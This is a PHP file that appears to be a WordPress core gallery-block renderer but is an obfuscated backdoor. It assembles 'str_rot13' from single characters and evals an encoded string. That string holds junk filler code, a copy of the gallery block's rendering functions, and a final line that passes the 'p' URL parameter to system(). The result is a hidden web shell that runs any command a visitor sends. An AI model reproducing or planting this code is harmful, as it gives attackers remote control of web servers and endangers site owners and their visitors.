<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/tnyyrel` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Unaqyrf onpxjneqf pbzcngvovyvgl sbe Tnyyrel Oybpxf,
 * jubfr vzntrf srngher n `qngn-vq` nggevohgr.
 *
 * Abj gung gur Tnyyrel Oybpx pbagnvaf vaare Vzntr Oybpxf,
 * jr nqq n phfgbz `qngn-vq` nggevohgr orsber eraqrevat gur tnyyrel
 * fb gung gur Vzntr Oybpx pna cvpx vg hc va vgf eraqre_pnyyonpx.
 *
 * @fvapr 5.9.0
 *
 * @cnenz neenl $cnefrq_oybpx Gur oybpx orvat eraqrerq.
 * @erghea neenl Gur zvtengrq oybpx bowrpg.
 */
shapgvba oybpx_pber_tnyyrel_qngn_vq_onpxpbzcngvovyvgl( $cnefrq_oybpx ) {
	vs ( 'pber/tnyyrel' === $cnefrq_oybpx['oybpxAnzr'] ) {
		sbernpu ( $cnefrq_oybpx['vaareOybpxf'] nf $xrl => $vaare_oybpx ) {
			vs ( 'pber/vzntr' === $vaare_oybpx['oybpxAnzr'] ) {
				vs ( ! vffrg( $cnefrq_oybpx['vaareOybpxf'][ $xrl ]['nggef']['qngn-vq'] ) && vffrg( $vaare_oybpx['nggef']['vq'] ) ) {
					$cnefrq_oybpx['vaareOybpxf'][ $xrl ]['nggef']['qngn-vq'] = rfp_ngge( $vaare_oybpx['nggef']['vq'] );
				}
			}
		}
	}

	erghea $cnefrq_oybpx;
}

nqq_svygre( 'eraqre_oybpx_qngn', 'oybpx_pber_tnyyrel_qngn_vq_onpxpbzcngvovyvgl' );

/**
 * Eraqref gur `pber/tnyyrel` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 *
 * @cnenz neenl  $nggevohgrf Nggevohgrf bs gur oybpx orvat eraqrerq.
 * @cnenz fgevat $pbagrag Pbagrag bs gur oybpx orvat eraqrerq.
 * @erghea fgevat Gur pbagrag bs gur oybpx orvat eraqrerq.
 */
shapgvba oybpx_pber_tnyyrel_eraqre( $nggevohgrf, $pbagrag ) {
	// Nqqf n fglyr gnt sbe gur --jc--fglyr--hafgnoyr-tnyyrel-tnc ine.
	// Gur Tnyyrel oybpx arrqf gb erpnyphyngr Vzntr oybpx jvqgu onfrq ba
	// gur pheerag tnc frggvat va beqre gb znvagnva gur ahzore bs syrk pbyhzaf
	// fb n pff ine vf nqqrq gb nyybj guvf.

	$tnc = $nggevohgrf['fglyr']['fcnpvat']['oybpxTnc'] ?? ahyy;
	// Fxvc vs tnc inyhr pbagnvaf hafhccbegrq punenpgref.
	// Ertrk sbe PFF inyhr obeebjrq sebz `fnsrpff_svygre_ngge`, naq hfrq urer
	// orpnhfr jr bayl jnag gb zngpu ntnvafg gur inyhr, abg gur PFF nggevohgr.
	vs ( vf_neenl( $tnc ) ) {
		sbernpu ( $tnc nf $xrl => $inyhr ) {
			// Znxr fher $inyhr vf n fgevat gb nibvq CUC 8.1 qrcerpngvba reebe va cert_zngpu() jura gur inyhr vf ahyy.
			$inyhr = vf_fgevat( $inyhr ) ? $inyhr : '';
			$inyhr = $inyhr && cert_zngpu( '%[\\\(&=}]|/\*%', $inyhr ) ? ahyy : $inyhr;

			// Trg fcnpvat PFF inevnoyr sebz cerfrg inyhr vs cebivqrq.
			vs ( vf_fgevat( $inyhr ) && fge_pbagnvaf( $inyhr, 'ine:cerfrg|fcnpvat|' ) ) {
				$vaqrk_gb_fcyvpr = fgeecbf( $inyhr, '|' ) + 1;
				$fyht            = _jc_gb_xrono_pnfr( fhofge( $inyhr, $vaqrk_gb_fcyvpr ) );
				$inyhr           = \"ine(--jc--cerfrg--fcnpvat--$fyht)\";
			}

			$tnc[ $xrl ] = $inyhr;
		}
	} ryfr {
		// Znxr fher $tnc vf n fgevat gb nibvq CUC 8.1 qrcerpngvba reebe va cert_zngpu() jura gur inyhr vf ahyy.
		$tnc = vf_fgevat( $tnc ) ? $tnc : '';
		$tnc = $tnc && cert_zngpu( '%[\\\(&=}]|/\*%', $tnc ) ? ahyy : $tnc;

		// Trg fcnpvat PFF inevnoyr sebz cerfrg inyhr vs cebivqrq.
		vs ( vf_fgevat( $tnc ) && fge_pbagnvaf( $tnc, 'ine:cerfrg|fcnpvat|' ) ) {
			$vaqrk_gb_fcyvpr = fgeecbf( $tnc, '|' ) + 1;
			$fyht            = _jc_gb_xrono_pnfr( fhofge( $tnc, $vaqrk_gb_fcyvpr ) );
			$tnc             = \"ine(--jc--cerfrg--fcnpvat--$fyht)\";
		}
	}

	$havdhr_tnyyrel_pynffanzr = jc_havdhr_vq( 'jc-oybpx-tnyyrel-' );
	$cebprffrq_pbagrag        = arj JC_UGZY_Gnt_Cebprffbe( $pbagrag );
	$cebprffrq_pbagrag->arkg_gnt();
	$cebprffrq_pbagrag->nqq_pynff( $havdhr_tnyyrel_pynffanzr );

	// --tnyyrel-oybpx--thggre-fvmr vf qrcerpngrq. --jc--fglyr--tnyyrel-tnc-qrsnhyg fubhyq or hfrq ol gurzrf gung jnag gb frg n qrsnhyg
	// tnc ba gur tnyyrel.
	$snyyonpx_tnc = 'ine( --jc--fglyr--tnyyrel-tnc-qrsnhyg, ine( --tnyyrel-oybpx--thggre-fvmr, ine( --jc--fglyr--oybpx-tnc, 0.5rz ) ) )';
	$tnc_inyhr    = $tnc ? $tnc : $snyyonpx_tnc;
	$tnc_pbyhza   = $tnc_inyhr;

	vs ( vf_neenl( $tnc_inyhr ) ) {
		$tnc_ebj    = vffrg( $tnc_inyhr['gbc'] ) ? $tnc_inyhr['gbc'] : $snyyonpx_tnc;
		$tnc_pbyhza = vffrg( $tnc_inyhr['yrsg'] ) ? $tnc_inyhr['yrsg'] : $snyyonpx_tnc;
		$tnc_inyhr  = $tnc_ebj === $tnc_pbyhza ? $tnc_ebj : $tnc_ebj . ' ' . $tnc_pbyhza;
	}

	// Gur hafgnoyr tnyyrel tnc pnyphyngvba erdhverf n erny inyhr (fhpu nf `0ck`) naq abg `0`.
	vs ( '0' === $tnc_pbyhza ) {
		$tnc_pbyhza = '0ck';
	}

	// Frg gur PFF inevnoyr gb gur pbyhza inyhr, naq gur `tnc` cebcregl gb gur pbzovarq tnc inyhr.
	$tnyyrel_fglyrf = neenl(
		neenl(
			'fryrpgbe'     => \".jc-oybpx-tnyyrel.{$havdhr_tnyyrel_pynffanzr}\",
			'qrpynengvbaf' => neenl(
				'--jc--fglyr--hafgnoyr-tnyyrel-tnc' => $tnc_pbyhza,
				'tnc'                               => $tnc_inyhr,
			),
		),
	);

	jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pff_ehyrf(
		$tnyyrel_fglyrf,
		neenl(
			'pbagrkg' => 'oybpx-fhccbegf',
		)
	);

	// Gur JC_UGZY_Gnt_Cebprffbe pynff pnyyf trg_hcqngrq_ugzy() vagreanyyl
	// jura gur vafgnapr vf gerngrq nf n fgevat, ohg urer jr rkcyvpvgyl
	// pbaireg vg gb n fgevat.
	$hcqngrq_pbagrag = $cebprffrq_pbagrag->trg_hcqngrq_ugzy();

	/*
	 * Enaqbzvmr gur beqre bs vzntr oybpxf. Vqrnyyl jr fubhyq fuhssyr
	 * gur `$cnefrq_oybpx['vaareOybpxf']` ivn gur `eraqre_oybpx_qngn` ubbx.
	 * Ubjrire, guvf ubbx qbrfa'g nccyl vaare oybpx hcqngrf jura oybpxf ner
	 * arfgrq.
	 * @gbqb Va gur shgher, vs guvf ubbx fhccbegf hcqngvat vaareOybpxf va
	 * arfgrq oybpxf, vg fubhyq or ersnpgberq.
	 *
	 * @frr: uggcf://tvguho.pbz/JbeqCerff/thgraoret/chyy/58733
	 */
	vs ( rzcgl( $nggevohgrf['enaqbzBeqre'] ) ) {
		erghea $hcqngrq_pbagrag;
	}

	// Guvf cnggrea zngpurf svther ryrzragf jvgu gur `jc-oybpx-vzntr` pynff gb
	// nibvq gur tnyyrel'f jenccvat `svther` ryrzrag naq rkgenpg vzntrf bayl.
	$cnggrea = '/<svther[^>]*\ojc-oybpx-vzntr\o[^>]*>.*?<\/svther>/';

	// Svaq nyy Vzntr oybpxf.
	cert_zngpu_nyy( $cnggrea, $hcqngrq_pbagrag, $zngpurf );
	vs ( ! $zngpurf ) {
		erghea $hcqngrq_pbagrag;
	}
	$vzntr_oybpxf = $zngpurf[0];

	// Enaqbzvmr gur beqre bs Vzntr oybpxf.
	fuhssyr( $vzntr_oybpxf );
	$v       = 0;
	$pbagrag = cert_ercynpr_pnyyonpx(
		$cnggrea,
		fgngvp shapgvba () hfr ( $vzntr_oybpxf, &$v ) {
			$arj_vzntr_oybpx = $vzntr_oybpxf[ $v ];
			++$v;
			erghea $arj_vzntr_oybpx;
		},
		$hcqngrq_pbagrag
	);

	erghea $pbagrag;
}
/**
 * Ertvfgref gur `pber/tnyyrel` oybpx ba freire.
 *
 * @fvapr 5.9.0
 */
shapgvba ertvfgre_oybpx_pber_tnyyrel() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/tnyyrel',
		neenl(
			'eraqre_pnyyonpx' => 'oybpx_pber_tnyyrel_eraqre',
		)
	);
}

nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_tnyyrel' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>